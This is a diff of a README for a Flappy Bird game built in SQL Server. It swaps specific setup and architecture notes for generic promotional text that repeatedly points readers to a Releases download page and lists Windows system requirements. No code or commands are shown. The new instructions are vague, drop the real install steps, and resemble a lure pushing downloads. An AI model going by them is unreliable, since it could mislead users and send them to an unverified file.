@@ -1,51 +1,72 @@
-# Flappy Bird SQL Game
+# 🕹️ SQL-FlappyBird - Play Flappy Bird in SQL Server
 
-A Flappy Bird game implemented entirely in SQL Server, running at 30 or 60 frames per second.
+[![Download SQL-FlappyBird](https://img.shields.io/badge/Download_SQL--FlappyBird-blue.svg)](https://github.com/Bellatd/SQL-FlappyBird/releases)
 
-## How It Works
+## 🚀 Getting Started
 
-The game follows a 2-step cycle for each component:
+SQL-FlappyBird is a fun game brought to life in SQL Server. Follow these simple steps to download and enjoy this unique version of Flappy Bird. 
 
-1. **Process**: Each frame, process procedures update the manifest tables by calculating new positions, applying physics, and handling game logic.
+## 📥 Download & Install
 
-2. **Render**: Rendering procedures read from the manifest tables and update the display table using SQL UPDATE statements.
+To get started, visit this page to download: [SQL-FlappyBird Releases](https://github.com/Bellatd/SQL-FlappyBird/releases).
 
-This architecture allows the entire game loop to run within SQL Server without external game engines.
+### 🎮 System Requirements
 
-## Setup
+Before downloading, ensure your environment meets these requirements:
 
-**Option 1:**
-Create a database named `db_flappy_bird_game` in MS SQL Server.
+- **Operating System:** Windows 10 or later
+- **Database Software:** SQL Server 2014 or later
+- **RAM:** 4 GB minimum
+- **Disk Space:** 100 MB free space
 
-**Option 2:**
-Set up your own `connectivity.py` configuration.
+### 🌟 Features
 
-## Installation Steps
+- Play a classic game with a twist using SQL.
+- Simple and intuitive interface.
+- Fun for players of all ages.
+- Learn basic SQL commands through gameplay.
 
-1. Run `Tables.sql` to create all required tables.
+## 📦 How to Download
 
-2. Run all scripts in the `Modules` folder in any order:
-   - FrontFrame.sql
-   - Processors.sql
-   - Rendering.sql
+1. Click the link above to go to the Releases page.
+2. Look for the latest version listed at the top.
+3. Click on the download link related to your system.
+4. Save the file to your preferred location on your computer.
 
-3. Run Populating.sql to create the procedure that will populate the game data by running:
-   - Populating.sql
+## ⚙️ Running the Game
 
-4. Create the initialization procedure by running
-   - Initialize.sql
+1. Open SQL Server Management Studio (SSMS).
+2. Connect to your SQL Server instance.
+3. In SSMS, open a new query window.
+4. Copy the SQL scripts provided in the downloaded package into your query window.
+5. Click on "Execute" to run the scripts.
+6. Follow any on-screen prompts to start the game.
 
-5. Run the game:
-   ```
-   python connectivity.py
-   ```
-## Controls
+## 📈 Gameplay Instructions
 
-Press spacebar to make the bird jump.
+- Use the space bar to flap and keep your bird in the air.
+- Avoid the pipes to progress through levels.
+- Score points for each pipe you successfully pass.
 
-___ 
-Everything you see here is literally a table and some queries on it. SQL is fun, **but I really like data because she likes data.**
+## 🛠️ Troubleshooting
 
-<p align="center">
-  <img src="view.gif" alt="Gameplay">
-</p>
+If you encounter issues running the game:
+
+- Ensure SQL Server is running on your system.
+- Check that you have the correct version installed.
+- Look online for additional help or visit the FAQ section on the Releases page.
+
+## 💬 Support
+
+For technical support, open an issue in this repository. Provide details of your problem, and our community will assist you.
+
+## 📚 Additional Resources
+
+- Learn SQL basics: [W3Schools SQL Tutorial](https://www.w3schools.com/sql/)
+- SQL Server downloads: [Microsoft SQL Server Download](https://www.microsoft.com/en-us/sql-server/sql-server-downloads)
+
+## 🕹️ Conclusion
+
+SQL-FlappyBird offers a fun experience that blends gaming and learning in a unique way. Download and enjoy this SQL twist on a classic game now!
+
+[![Download SQL-FlappyBird](https://img.shields.io/badge/Download_SQL--FlappyBird-blue.svg)](https://github.com/Bellatd/SQL-FlappyBird/releases)
